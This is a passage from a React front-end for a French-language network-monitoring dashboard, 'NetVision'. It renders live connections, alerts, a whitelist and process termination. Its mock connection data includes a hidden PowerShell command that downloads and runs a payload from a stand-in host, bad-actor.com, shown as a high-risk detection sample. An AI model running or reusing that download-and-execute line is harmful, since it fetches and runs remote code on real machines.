import React, { useState, useEffect, useRef } from 'react';
import { 
  Shield, Activity, Server, Radio, Terminal, Settings, Clock, 
  Trash2, X, Copy, Check, ArrowUp, ArrowDown, 
  Search, ShieldAlert, Cpu, Database, Plus, RefreshCw, FileText, Globe
} from 'lucide-react';

const API_BASE = 'http://127.0.0.1:8000/api/v1';
const WS_URL = 'ws://127.0.0.1:8000/ws/stream';

// Fallback Mock Data for demo and layout preview if backend is disconnected
const MOCK_CONNECTIONS = [
  { pid: 1420, process_name: "chrome.exe", process_path: "C:\\Program Files\\Google\\Chrome\\chrome.exe", username: "aymane", cmdline: "chrome.exe --type=renderer --field-trial-handle=1528", local_ip: "127.0.0.1", local_port: 52401, remote_ip: "142.250.200.46", remote_port: 443, protocol: "TCP", status: "ESTABLISHED", bytes_sent: 104230, bytes_recv: 954302, risk_score: 12, alerts: [], process_hash: "3a9f8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a", domain_name: "google.com" },
  { pid: 4812, process_name: "unknown_updater.exe", process_path: "C:\\Users\\aymane\\AppData\\Local\\Temp\\unknown_updater.exe", username: "aymane", cmdline: "unknown_updater.exe --silent --port=8080", local_ip: "127.0.0.1", local_port: 49210, remote_ip: "185.220.101.5", remote_port: 80, protocol: "TCP", status: "ESTABLISHED", bytes_sent: 4502000, bytes_recv: 120000, risk_score: 85, alerts: ["Processus non signé lancé depuis Temp", "Destination Tor Node connue"], process_hash: "d41d8cd98f00b204e9800998ecf8427eef1234567890abcdef1234567890abcd", domain_name: "onion-router.tor" },
  { pid: 2110, process_name: "svchost.exe", process_path: "C:\\Windows\\System32\\svchost.exe", username: "SYSTEM", cmdline: "svchost.exe -k LocalService -p", local_ip: "127.0.0.1", local_port: 123, remote_ip: "8.8.8.8", remote_port: 123, protocol: "UDP", status: "NONE", bytes_sent: 1024, bytes_recv: 2048, risk_score: 5, alerts: [], process_hash: "f248234857b2837f827aef92a83bd7a812837f62d82bb7a82b9a712f6354b423", domain_name: "dns.google" },
  { pid: 8840, process_name: "discord.exe", process_path: "C:\\Users\\aymane\\AppData\\Local\\Discord\\app-1.0.9001\\discord.exe", username: "aymane", cmdline: "discord.exe --multi-instance", local_ip: "127.0.0.1", local_port: 50123, remote_ip: "162.159.135.234", remote_port: 443, protocol: "TCP", status: "ESTABLISHED", bytes_sent: 340912, bytes_recv: 2901242, risk_score: 22, alerts: [], process_hash: "28e1d7a9b0c2e3f40d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c", domain_name: "gateway.discord.gg" },
  { pid: 9005, process_name: "python.exe", process_path: "/home/aymane/NetVision/.venv/bin/python", username: "aymane", cmdline: "python main.py", local_ip: "127.0.0.1", local_port: 8000, remote_ip: "127.0.0.1", remote_port: 52401, protocol: "TCP", status: "ESTABLISHED", bytes_sent: 99403, bytes_recv: 88432, risk_score: 0, alerts: ["Autorisé par la liste blanche"], process_hash: "ef82736b51a0293d8b746c2eb8c1a02bb84eef192bda7382218e8d8eeabac4a1" },
  { pid: 3120, process_name: "powershell.exe", process_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", username: "aymane", cmdline: "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://bad-actor.com/payload')", local_ip: "127.0.0.1", local_port: 59381, remote_ip: "91.198.174.192", remote_port: 80, protocol: "TCP", status: "ESTABLISHED", bytes_sent: 2400, bytes_recv: 504000, risk_score: 95, alerts: ["PowerShell caché exécutant IEX/DownloadString", "Score de risque réseau critique"], process_hash: "557ae1234bc57b28f912c98d7eb1923fa9f8e7123ad892bb7a82b9a712f6354b" }
];

function App() {
  // Navigation & Page state
  const [activeTab, setActiveTab] = useState('Topologie'); // 'Topologie', 'Paramètres', 'Alertes', 'Processus'
  const [sidebarItems, setSidebarItems] = useState([
    { id: 'Topologie', label: 'Topologie', icon: Radio },
    { id: 'Tableau de bord', label: 'Tableau de bord', icon: Activity },
    { id: 'Processus', label: 'Processus', icon: Cpu },
    { id: 'Connexions', label: 'Connexions', icon: Server },
    { id: 'Alertes', label: 'Alertes', icon: ShieldAlert, badge: 0 },
    { id: 'Analyse VT', label: 'Analyse VT', icon: FileText },
    { id: 'Paramètres', label: 'Paramètres', icon: Settings },
  ]);

  // Real-time & API state
  const [connections, setConnections] = useState(MOCK_CONNECTIONS);
  const [alerts, setAlerts] = useState([]);
  const [whitelist, setWhitelist] = useState([]);
  const [wsConnected, setWsConnected] = useState(false);
  const [loadingAlerts, setLoadingAlerts] = useState(false);

  // Selection state
  const [selectedConn, setSelectedConn] = useState(MOCK_CONNECTIONS[1]); // Pre-select a warning process for beautiful initial load
  const [copiedPid, setCopiedPid] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);

  // Search states
  const [searchConn, setSearchConn] = useState('');
  const [searchProc, setSearchProc] = useState('');
  const [searchAlert, setSearchAlert] = useState('');

  // Filters for Event Log
  const [filterProtocol, setFilterProtocol] = useState('Tous');
  const [filterLevel, setFilterLevel] = useState('Tous');

  // Whitelist form state
  const [newRuleType, setNewRuleType] = useState('IP');
  const [newRuleValue, setNewRuleValue] = useState('');
  const [newRuleDesc, setNewRuleDesc] = useState('');

  // Clock
  const [timeStr, setTimeStr] = useState('');
  const [dateStr, setDateStr] = useState('');

  // Live network traffic rates (calculated based on increments)
  const [uploadRate, setUploadRate] = useState(1.24);
  const [downloadRate, setDownloadRate] = useState(4.56);
  const prevBytesRef = useRef({ sent: 0, recv: 0, time: Date.now() });

  // Canvas Refs
  const canvasRef = useRef(null);
  const animationRef = useRef(null);
  const nodePositionsRef = useRef({});

  // WebSocket Connection
  useEffect(() => {
    let ws;
    let reconnectTimeout;

    function connectWS() {
      ws = new WebSocket(WS_URL);

      ws.onopen = () => {
        setWsConnected(true);
        console.log("WebSocket connecté au backend NetVision.");
      };

      ws.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (Array.isArray(data)) {
            setConnections(data);
            
            // Calculate real-time rates
            const now = Date.now();
            const elapsed = (now - prevBytesRef.current.time) / 1000;
            const totalSent = data.reduce((acc, c) => acc + (c.bytes_sent || 0), 0);
            const totalRecv = data.reduce((acc, c) => acc + (c.bytes_recv || 0), 0);

            if (prevBytesRef.current.sent > 0 && elapsed > 0.5) {
              const diffSent = Math.max(0, totalSent - prevBytesRef.current.sent);
              const diffRecv = Math.max(0, totalRecv - prevBytesRef.current.recv);
              
              // Smooth rate using sliding factor
              setUploadRate(prev => parseFloat((prev * 0.7 + (diffSent / elapsed / 1024 / 1024) * 0.3).toFixed(2)));
              setDownloadRate(prev => parseFloat((prev * 0.7 + (diffRecv / elapsed / 1024 / 1024) * 0.3).toFixed(2)));
            }

            prevBytesRef.current = { sent: totalSent, recv: totalRecv, time: now };

            // If selected connection is still in the active list, update its details
            setSelectedConn(current => {
              if (!current) return null;
              const updated = data.find(c => c.pid === current.pid && c.remote_ip === current.remote_ip);
              return updated ? updated : current;
            });
          }
        } catch (err) {
          console.error("Erreur de parsing WebSocket:", err);
        }
      };

      ws.onclose = () => {
        setWsConnected(false);
        console.log("WebSocket fermé. Tentative de reconnexion...");
        reconnectTimeout = setTimeout(connectWS, 3000);
      };

      ws.onerror = (err) => {
        ws.close();
      };
    }

    connectWS();

    return () => {
      if (ws) ws.close();
      clearTimeout(reconnectTimeout);
    };
  }, []);

  // Fetch alerts and whitelist
  const fetchAlerts = async () => {
    setLoadingAlerts(true);
    try {
      const res = await fetch(`${API_BASE}/alerts/?limit=50&protocol=${filterProtocol.toUpperCase()}`);
      if (res.ok) {
        const data = await res.json();
        // apply risk level client-side filter
        const filtered = data.filter(a => {
          if (filterLevel === 'ALERT') return a.risk_score >= 70;
          if (filterLevel === 'WARN') return a.risk_score >= 30 && a.risk_score < 70;
          if (filterLevel === 'INFO') return a.risk_score < 30;
          return true;
        });
        setAlerts(filtered);
        
        // Update alert badge count
        const alertCount = filtered.filter(a => a.risk_score >= 70).length;
        setSidebarItems(prev => prev.map(item => 
          item.id === 'Alertes' ? { ...item, badge: alertCount } : item
        ));
      }
    } catch (err) {
      console.error("Impossible de charger les alertes:", err);
    } finally {
      setLoadingAlerts(false);
    }
  };

  const fetchWhitelist = async () => {
    try {
      const res = await fetch(`${API_BASE}/whitelist/`);
      if (res.ok) {
        const data = await res.json();
        setWhitelist(data);
      }
    } catch (err) {
      console.error("Impossible de charger la liste blanche:", err);
    }
  };

  useEffect(() => {
    fetchAlerts();
    fetchWhitelist();
    // Refresh alerts every 5 seconds to match updates
    const interval = setInterval(fetchAlerts, 5000);
    return () => clearInterval(interval);
  }, [filterProtocol, filterLevel]);

  // Clock tick
  useEffect(() => {
    const updateTime = () => {
      const d = new Date();
      setTimeStr(d.toLocaleTimeString('fr-FR'));
      setDateStr(d.toLocaleDateString('fr-FR', { weekday: 'short', day: 'numeric', month: 'short' }));
    };
    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, []);

  // Actions
  const clearLogs = async () => {
    if (window.confirm("Êtes-vous sûr de vouloir vider le journal des alertes ?")) {
      try {
        const res = await fetch(`${API_BASE}/alerts/clear`, { method: 'DELETE' });
        if (res.ok) {
          fetchAlerts();
        }
      } catch (err) {
        console.error("Erreur lors du nettoyage des logs:", err);
      }
    }
  };

  const killProcess = async (pid) => {
    if (!pid) return;
    if (window.confirm(`⚠️ ATTENTION : Vous allez tuer le processus PID ${pid}. Continuer ?`)) {
      try {
        const res = await fetch(`${API_BASE}/process/${pid}`, { method: 'DELETE' });
        const data = await res.json();
        if (res.ok) {
          alert(`Succès : ${data.message}`);
          setSelectedConn(null);
          // Remove from local list immediately
          setConnections(prev => prev.filter(c => c.pid !== pid));
        } else {
          alert(`Erreur : ${data.detail || "Impossible de tuer le processus."}`);
        }
      } catch (err) {
        alert("Erreur de communication avec le serveur.");
        console.error(err);
      }
    }
  };

  const addToWhitelist = async (e) => {
    e.preventDefault();
    if (!newRuleValue.trim()) return;

    try {
      const res = await fetch(`${API_BASE}/whitelist/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          rule_type: newRuleType,
          value: newRuleValue,
          description: newRuleDesc
        })
      });

      if (res.ok) {
        setNewRuleValue('');
        setNewRuleDesc('');
        fetchWhitelist();
        alert("Règle ajoutée avec succès !");
      }
    } catch (err) {
      console.error(err);
      alert("Erreur lors de l'ajout à la liste blanche.");
    }
  };

  const removeWhitelistRule = async (id) => {
    try {
      const res = await fetch(`${API_BASE}/whitelist/${id}`, { method: 'DELETE' });
      if (res.ok) {
        fetchWhitelist();
      }
    } catch (err) {
      console.error(err);
    }
  };

  // Metrics calculations
  const totalConn = connections.length;
  const tcpConn = connections.filter(c => c.protocol === 'TCP').length;
  const udpConn = connections.filter(c => c.protocol === 'UDP').length;
  
  // threat score is average of top 3 worst connections
  const sortedRisks = [...connections].map(c => c.risk_score || 0).sort((a,b) => b-a);
  const globalThreatScore = sortedRisks.length > 0 
    ? Math.round(sortedRisks.slice(0, 3).reduce((a,b) => a+b, 0) / Math.min(3, sortedRisks.length))
    : 0;

  const getThreatLabel = (score) => {
    if (score >= 70) return { label: 'CRITIQUE', color: 'text-cyber-red' };
    if (score >= 30) return { label: 'MOYEN', color: 'text-cyber-orange' };
    return { label: 'FAIBLE', color: 'text-cyber-green' };
  };

  // HTML5 Canvas Network Topology Rendering
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    let width = canvas.offsetWidth;
    let height = canvas.offsetHeight;
    canvas.width = width;
    canvas.height = height;

    let time = 0;

    const render = () => {
      time += 0.03;
      ctx.clearRect(0, 0, width, height);

      // Node centers
      const centerX = width / 2;
      const centerY = height / 2;

      // Draw Grid helper
      ctx.strokeStyle = 'rgba(0, 242, 254, 0.015)';
      ctx.lineWidth = 1;
      for (let i = 0; i < width; i += 40) {
        ctx.beginPath();
        ctx.moveTo(i, 0);
        ctx.lineTo(i, height);
        ctx.stroke();
      }
      for (let j = 0; j < height; j += 40) {
        ctx.beginPath();
        ctx.moveTo(0, j);
        ctx.lineTo(width, j);
        ctx.stroke();
      }

      // Group connections by remote IP to collapse nodes nicely
      const uniqueRemotes = {};
      connections.forEach(conn => {
        if (!uniqueRemotes[conn.remote_ip]) {
          uniqueRemotes[conn.remote_ip] = [];
        }
        uniqueRemotes[conn.remote_ip].push(conn);
      });

      const remotesList = Object.entries(uniqueRemotes);
      const satelliteCount = remotesList.length;

      // Radial configuration - Expanded orbits
      const radiusX = Math.min(width * 0.38, 420);
      const radiusY = Math.min(height * 0.36, 280);

      // 1. Draw central node glowing circles
      const centralPulse = Math.sin(time * 2) * 5 + 40;
      ctx.beginPath();
      const grad = ctx.createRadialGradient(centerX, centerY, 5, centerX, centerY, centralPulse + 20);
      grad.addColorStop(0, 'rgba(0, 102, 255, 0.4)');
      grad.addColorStop(0.5, 'rgba(0, 102, 255, 0.1)');
      grad.addColorStop(1, 'transparent');
      ctx.fillStyle = grad;
      ctx.arc(centerX, centerY, centralPulse + 20, 0, Math.PI * 2);
      ctx.fill();

      // Central core
      ctx.beginPath();
      ctx.arc(centerX, centerY, 30, 0, Math.PI * 2);
      ctx.fillStyle = '#0d111a';
      ctx.strokeStyle = '#0066ff';
      ctx.lineWidth = 3.5;
      ctx.shadowColor = '#0066ff';
      ctx.shadowBlur = 15;
      ctx.fill();
      ctx.stroke();
      ctx.shadowBlur = 0; // reset shadow

      // Center PC symbol (Enlarged)
      ctx.fillStyle = '#ffffff';
      ctx.font = 'bold 12px monospace';
      ctx.textAlign = 'center';
      ctx.fillText("MON PC", centerX, centerY + 4);
      ctx.font = '10px monospace';
      ctx.fillStyle = 'rgba(0, 242, 254, 0.9)';
      ctx.fillText("127.0.0.1", centerX, centerY + 16);

      // Store positions for click detection
      const newPositions = {
        center: { x: centerX, y: centerY, r: 40, isCenter: true }
      };

      // 2. Draw satellite nodes and connections
      remotesList.forEach(([ip, conns], idx) => {
        // Distribute nicely along an oval orbit, alternating radius to prevent overlaps
        const angle = (idx / satelliteCount) * Math.PI * 2 + (time * 0.05);
        const isEven = idx % 2 === 0;
        const currentRadiusX = isEven ? radiusX : radiusX * 1.35;
        const currentRadiusY = isEven ? radiusY : radiusY * 1.35;

        const x = centerX + Math.cos(angle) * currentRadiusX;
        const y = centerY + Math.sin(angle) * currentRadiusY;

        // Peak risk in this group
        const maxRisk = Math.max(...conns.map(c => c.risk_score || 0));
        const activeConn = conns[0];
        
        let nodeColor = '#00e676'; // safe
        let glowColor = 'rgba(0, 230, 118, 0.4)';
        if (maxRisk >= 70) {
          nodeColor = '#ff3344'; // danger
          glowColor = 'rgba(255, 51, 68, 0.5)';
        } else if (maxRisk >= 30) {
          nodeColor = '#ff9900'; // warning
          glowColor = 'rgba(255, 153, 0, 0.4)';
        }

        // Draw connection lines
        ctx.beginPath();
        ctx.moveTo(centerX, centerY);
        ctx.lineTo(x, y);
        
        // Solid or dashed line based on protocol
        const hasUdp = conns.some(c => c.protocol === 'UDP');
        if (hasUdp) {
          ctx.setLineDash([5, 5]);
          ctx.strokeStyle = 'rgba(0, 242, 254, 0.35)';
        } else {
          ctx.setLineDash([]);
          ctx.strokeStyle = 'rgba(0, 242, 254, 0.45)';
        }
        ctx.lineWidth = selectedConn && selectedConn.remote_ip === ip ? 2.5 : 1;
        ctx.stroke();
        ctx.setLineDash([]); // Reset line dash

        // Realtime data particles flowing along lines
        const particleSpeed = 0.05;
        const particlePos = (time * particleSpeed + (idx / satelliteCount)) % 1;
        const px = centerX + (x - centerX) * particlePos;
        const py = centerY + (y - centerY) * particlePos;
        
        ctx.beginPath();
        ctx.arc(px, py, 3, 0, Math.PI * 2);
        ctx.fillStyle = nodeColor;
        ctx.shadowColor = nodeColor;
        ctx.shadowBlur = 8;
        ctx.fill();
        ctx.shadowBlur = 0;

        // Draw pulsing outer ring for risky/warning nodes
        if (maxRisk >= 30) {
          const satPulse = (Math.sin(time * 4 + idx) * 3) + 12;
          ctx.beginPath();
          ctx.arc(x, y, satPulse + 3, 0, Math.PI * 2);
          ctx.strokeStyle = glowColor;
          ctx.lineWidth = 1;
          ctx.stroke();
        }

        // Selected indicator ring
        if (selectedConn && selectedConn.remote_ip === ip) {
          ctx.beginPath();
          ctx.arc(x, y, 20, 0, Math.PI * 2);
          ctx.strokeStyle = '#00f2fe';
          ctx.lineWidth = 2;
          ctx.stroke();
        }

        // Node Circle (Slightly larger)
        ctx.beginPath();
        ctx.arc(x, y, 12, 0, Math.PI * 2);
        ctx.fillStyle = '#0d111a';
        ctx.strokeStyle = nodeColor;
        ctx.lineWidth = 2.5;
        ctx.fill();
        ctx.stroke();

        // Node Labels - With a solid dark bubble background to ensure 100% legibility
        const labelText = activeConn.domain_name || activeConn.process_name || ip;
        ctx.font = 'bold 12px monospace';
        const labelWidth = ctx.measureText(labelText).width;

        // Label bubble background
        ctx.fillStyle = 'rgba(11, 15, 25, 0.9)';
        ctx.fillRect(x - labelWidth / 2 - 6, y - 31, labelWidth + 12, 17);
        ctx.strokeStyle = 'rgba(0, 242, 254, 0.4)';
        ctx.lineWidth = 1;
        ctx.strokeRect(x - labelWidth / 2 - 6, y - 31, labelWidth + 12, 17);

        // Label text
        ctx.fillStyle = '#ffffff';
        ctx.textAlign = 'center';
        ctx.fillText(labelText, x, y - 18);

        // Sublabel (IP) bubble
        ctx.font = '10px monospace';
        const subLabelWidth = ctx.measureText(ip).width;
        ctx.fillStyle = 'rgba(11, 15, 25, 0.9)';
        ctx.fillRect(x - subLabelWidth / 2 - 6, y + 17, subLabelWidth + 12, 15);
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.15)';
        ctx.lineWidth = 1;
        ctx.strokeRect(x - subLabelWidth / 2 - 6, y + 17, subLabelWidth + 12, 15);

        // Sublabel text
        ctx.fillStyle = 'rgba(0, 242, 254, 0.95)';
        ctx.fillText(ip, x, y + 28);

        // Store positions for interactions
        newPositions[ip] = { x, y, r: 18, conn: activeConn };
      });

      nodePositionsRef.current = newPositions;
      animationRef.current = requestAnimationFrame(render);
    };

    render();

    return () => {
      cancelAnimationFrame(animationRef.current);
    };
  }, [connections, selectedConn]);

  // Click on Canvas handler
  const handleCanvasClick = (e) => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const rect = canvas.getBoundingClientRect();
    const clickX = e.clientX - rect.left;
    const clickY = e.clientY - rect.top;

    // Check if clicked any satellite node
    let found = false;
    Object.entries(nodePositionsRef.current).forEach(([key, pos]) => {
      if (key === 'center') return;
      
      const dist = Math.hypot(clickX - pos.x, clickY - pos.y);
      if (dist <= pos.r) {
        setSelectedConn(pos.conn);
        found = true;
      }
    });

    if (!found) {
      // clicking empty space doesn't close inspector to avoid accidental dismiss, 
      // but let's allow it if user clicks way off.
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-cyber-bg text-gray-300 font-sans antialiased overflow-x-hidden selection:bg-cyber-neon selection:text-black">
      
      {/* 1. TOP BAR */}
      <header className="flex flex-col lg:flex-row items-center justify-between px-6 py-4 border-b border-cyber-border bg-cyber-dark/85 backdrop-blur-md sticky top-0 z-50 gap-4">
        
        {/* Logo & Agent status */}
        <div className="flex items-center gap-3">
          <div className="relative">
            <div className="absolute inset-0 bg-cyber-neon/20 rounded-lg blur pulse-glow"></div>
            <div className="relative flex items-center justify-center w-10 h-10 bg-cyber-dark border border-cyber-neon rounded-lg glow-cyan">
              <Shield className="w-5 h-5 text-cyber-neon" />
            </div>
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-mono font-bold text-lg text-white tracking-wider">NETVISION</span>
              <span className="text-[10px] px-1.5 py-0.5 rounded bg-cyber-neon/10 border border-cyber-neon/20 text-cyber-neon font-mono">v1.0.0</span>
            </div>
            <div className="flex items-center gap-1.5 mt-0.5">
              <span className={`w-2.5 h-2.5 rounded-full ${wsConnected ? 'bg-cyber-green animate-pulse' : 'bg-cyber-red animate-ping'}`}></span>
              <span className="text-[10px] text-gray-400 font-mono">
                {wsConnected ? 'Agent Actif (En Ligne)' : 'Hors ligne - Mode Démo'}
              </span>
            </div>
          </div>
        </div>

        {/* Throughput Metrics */}
        <div className="flex items-center gap-6 bg-cyber-bg/50 border border-cyber-border/40 rounded-lg px-4 py-2 font-mono text-xs">
          <div className="flex items-center gap-2">
            <ArrowUp className="w-4 h-4 text-cyber-green" />
            <div>
              <span className="text-gray-500 block text-[9px]">ENVOI</span>
              <span className="text-cyber-green font-semibold">{uploadRate} MB/s</span>
            </div>
          </div>
          <div className="h-6 w-px bg-cyber-border/30"></div>
          <div className="flex items-center gap-2">
            <ArrowDown className="w-4 h-4 text-cyber-neon" />
            <div>
              <span className="text-gray-500 block text-[9px]">RÉCEPTION</span>
              <span className="text-cyber-neon font-semibold">{downloadRate} MB/s</span>
            </div>
          </div>
        </div>

        {/* Connections summary */}
        <div className="flex items-center gap-4 bg-cyber-bg/50 border border-cyber-border/40 rounded-lg px-4 py-2 font-mono text-xs">
          <div className="text-center">
            <span className="text-gray-500 block text-[9px]">CONNEXIONS</span>
            <span className="text-white font-bold">{totalConn}</span>
          </div>
          <div className="h-6 w-px bg-cyber-border/30"></div>
          <div className="text-center">
            <span className="text-gray-500 block text-[9px]">TCP</span>
            <span className="text-cyber-neon font-semibold">{tcpConn}</span>
          </div>
          <div className="h-6 w-px bg-cyber-border/30"></div>
          <div className="text-center">
            <span className="text-gray-500 block text-[9px]">UDP</span>
            <span className="text-cyber-orange font-semibold">{udpConn}</span>
          </div>
        </div>

        {/* Global Threat Gauge */}
        <div className="flex items-center gap-4 bg-cyber-bg/50 border border-cyber-border/40 rounded-lg px-4 py-2">
          {/* Half arc circle preview */}
          <div className="relative w-12 h-6 overflow-hidden">
            <div className="absolute top-0 left-0 w-12 h-12 rounded-full border-4 border-gray-800"></div>
            <div 
              className={`absolute top-0 left-0 w-12 h-12 rounded-full border-4 border-t-transparent border-l-transparent transition-all duration-1000`}
              style={{
                borderColor: globalThreatScore >= 70 ? '#ff3344' : globalThreatScore >= 30 ? '#ff9900' : '#00e676',
                transform: `rotate(${Math.min(180, (globalThreatScore / 100) * 180) - 135}deg)`
              }}
            ></div>
          </div>
          <div className="font-mono text-xs">
            <span className="text-gray-500 block text-[9px]">MENACE GLOBALE</span>
            <div className="flex items-center gap-2">
              <span className="text-white font-bold">{globalThreatScore} / 100</span>
              <span className={`font-bold text-[10px] ${getThreatLabel(globalThreatScore).color}`}>
                {getThreatLabel(globalThreatScore).label}
              </span>
            </div>
          </div>
        </div>

        {/* Date & clock */}
        <div className="flex items-center gap-3 font-mono text-xs text-right">
          <div className="hidden sm:block">
            <span className="text-gray-500 block text-[9px]">{dateStr}</span>
            <span className="text-white font-bold">{timeStr}</span>
          </div>
          <Clock className="w-5 h-5 text-cyber-neon" />
        </div>

      </header>

      {/* BODY GRID */}
      <div className="flex-grow grid grid-cols-1 lg:grid-cols-12 gap-4 p-4">
        
        {/* A. SIDEBAR GAUCHE (Navigation & Légende) */}
        <aside className="col-span-1 lg:col-span-2 flex flex-col justify-between bg-cyber-dark border border-cyber-border rounded-xl p-4 gap-6">
          
          <div className="flex flex-col gap-4">
            <div className="text-[10px] tracking-wider text-gray-500 font-bold uppercase font-mono px-2">Navigation</div>
            <nav className="flex flex-col gap-1">
              {sidebarItems.map(item => {
                const IconComponent = item.icon;
                const isActive = activeTab === item.id;
                return (
                  <button
                    key={item.id}
                    onClick={() => setActiveTab(item.id)}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-sm transition-all duration-200 border group ${
                      isActive 
                        ? 'bg-cyber-neon/10 border-cyber-neon/40 text-cyber-neon glow-cyan' 
                        : 'border-transparent text-gray-400 hover:bg-slate-800/40 hover:text-white'
                    }`}
                  >
                    <div className="flex items-center gap-2.5">
                      <IconComponent className={`w-4 h-4 transition-transform group-hover:scale-110 ${isActive ? 'text-cyber-neon' : 'text-gray-500'}`} />
                      <span>{item.label}</span>
                    </div>
                    {item.badge !== undefined && item.badge > 0 && (
                      <span className="text-[10px] bg-cyber-red text-white font-mono px-1.5 py-0.5 rounded-full font-bold">
                        {item.badge}
                      </span>
                    )}
                  </button>
                );
              })}
            </nav>
          </div>

          {/* Legend widget */}
          <div className="border-t border-cyber-border/40 pt-4 font-mono text-[10px] flex flex-col gap-3">
            <div className="tracking-wider text-gray-500 font-bold uppercase px-2">Légende Risques</div>
            <div className="flex flex-col gap-2 px-2">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-cyber-green shadow-[0_0_6px_#00e676]"></span>
                <span className="text-gray-400">Faible (&lt; 30)</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-cyber-orange shadow-[0_0_6px_#ff9900]"></span>
                <span className="text-gray-400">Moyen (30 - 70)</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-cyber-red shadow-[0_0_6px_#ff3344]"></span>
                <span className="text-gray-400">Élevé (&gt; 70)</span>
              </div>
            </div>
            
            <div className="border-t border-cyber-border/30 my-1"></div>

            <div className="tracking-wider text-gray-500 font-bold uppercase px-2">Protocoles</div>
            <div className="flex flex-col gap-2 px-2 text-[9px]">
              <div className="flex items-center gap-2">
                <span className="h-0.5 w-6 bg-cyber-neon"></span>
                <span className="text-gray-400">Flux TCP (Continu)</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="h-0.5 w-6 border-t border-dashed border-cyber-neon/60"></span>
                <span className="text-gray-400">Flux UDP (Discontinu)</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="w-1.5 h-1.5 rounded-full bg-cyber-neon animate-ping"></span>
                <span className="text-gray-400">Trafic temps réel</span>
              </div>
            </div>
          </div>

        </aside>

        {/* B. ZONE CENTRALE (Canvas ou autre Tab) */}
        <main className="col-span-1 lg:col-span-7 flex flex-col gap-4">
          
          {/* Main content viewport switcher */}
          <div className="flex-grow bg-cyber-dark border border-cyber-border rounded-xl flex flex-col overflow-hidden relative min-h-[580px]">
            
            {activeTab === 'Topologie' && (
              <>
                <div className="absolute top-4 left-4 z-10 pointer-events-none">
                  <h2 className="text-white font-mono text-sm tracking-wider font-bold">CARTE DES CONNEXIONS ACTIVES</h2>
                  <p className="text-[10px] text-gray-500 font-mono">Visualisation radiale interactive en temps réel</p>
                </div>
                <div className="absolute top-4 right-4 z-10 flex gap-2">
                  <button 
                    onClick={() => { setConnections(MOCK_CONNECTIONS); }} 
                    className="p-1.5 bg-cyber-bg border border-cyber-border hover:border-cyber-neon hover:text-white rounded text-gray-400 text-xs flex items-center gap-1 font-mono transition"
                    title="Simuler des connexions de test"
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                    <span>Demo Data</span>
                  </button>
                </div>

                <div className="flex-grow w-full h-full relative cursor-crosshair">
                  <canvas 
                    ref={canvasRef} 
                    onClick={handleCanvasClick} 
                    className="w-full h-full block bg-gradient-to-br from-cyber-bg to-cyber-dark cyber-grid"
                  />
                </div>
              </>
            )}

            {activeTab === 'Tableau de bord' && (
              <div className="p-6 flex flex-col gap-6 overflow-y-auto max-h-[500px]">
                <h2 className="text-white font-mono text-lg font-bold border-b border-cyber-border/40 pb-2">Statistiques & Analyse Réseau</h2>
                <div className="grid grid-cols-3 gap-4">
                  <div className="bg-cyber-bg border border-cyber-border p-4 rounded-lg font-mono text-center">
                    <span className="text-xs text-gray-500 block">Total Connexions</span>
                    <span className="text-3xl text-cyber-neon font-bold block mt-2">{connections.length}</span>
                  </div>
                  <div className="bg-cyber-bg border border-cyber-border p-4 rounded-lg font-mono text-center">
                    <span className="text-xs text-gray-500 block">Alertes Actives</span>
                    <span className="text-3xl text-cyber-red font-bold block mt-2">{alerts.length}</span>
                  </div>
                  <div className="bg-cyber-bg border border-cyber-border p-4 rounded-lg font-mono text-center">
                    <span className="text-xs text-gray-500 block">Règles Whitelist</span>
                    <span className="text-3xl text-cyber-green font-bold block mt-2">{whitelist.length}</span>
                  </div>
                </div>

                <div className="bg-cyber-bg border border-cyber-border p-4 rounded-lg">
                  <h3 className="text-white font-mono text-sm font-bold mb-3">Réseau Local vs IP Distantes</h3>
                  <div className="h-40 flex items-end justify-between gap-2 border-b border-cyber-border pb-2 pt-6">
                    {connections.slice(0, 10).map((c, i) => (
                      <div key={i} className="flex flex-col items-center flex-grow">
                        <div 
                          className={`w-full rounded-t transition-all duration-500 ${
                            c.risk_score >= 70 ? 'bg-cyber-red' : c.risk_score >= 30 ? 'bg-cyber-orange' : 'bg-cyber-green'
                          }`}
                          style={{ height: `${c.risk_score || 5}%`, minHeight: '8px' }}
                        ></div>
                        <span className="text-[8px] text-gray-500 font-mono mt-1 rotate-45 origin-left whitespace-nowrap">{c.process_name}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'Paramètres' && (
              <div className="p-6 flex flex-col gap-6 overflow-y-auto max-h-[500px]">
                <div>
                  <h2 className="text-white font-mono text-lg font-bold border-b border-cyber-border/40 pb-2">Gestion de la Liste Blanche (Exceptions)</h2>
                  <p className="text-xs text-gray-500 mt-1">Ajoutez des IP de confiance ou des noms d'exécutables pour exclure leurs flux de l'évaluation de menace.</p>
                </div>

                <form onSubmit={addToWhitelist} className="bg-cyber-bg/50 border border-cyber-border p-4 rounded-lg flex flex-col sm:flex-row gap-4 items-end">
                  <div className="flex-1 flex flex-col gap-2">
                    <label className="text-[10px] text-gray-400 font-mono uppercase">Type de règle</label>
                    <select 
                      value={newRuleType}
                      onChange={(e) => setNewRuleType(e.target.value)}
